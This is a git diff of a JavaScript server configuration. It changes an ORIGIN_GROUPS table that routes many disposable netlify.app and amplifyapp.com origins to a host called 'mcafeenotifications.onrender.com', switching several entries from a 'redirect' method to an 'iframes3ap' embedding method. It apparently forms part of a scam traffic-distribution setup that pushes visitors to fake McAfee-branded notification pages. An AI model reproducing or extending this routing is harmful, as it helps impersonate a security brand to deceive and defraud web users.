@@ -62,13 +62,13 @@ redis.on("error", (err) => console.error("Redis error:", err.message));
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
-    "https://cozy-kheer-cea1f9.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://lambent-maamoul-1de7b2.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://nimble-bonbon-e8f851.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://earnest-sawine-a7ac5c.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
-    "https://relaxed-pegasus-8e3b77.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
+    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
     "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://benevolent-medovik-1917c8.netlify.app" },
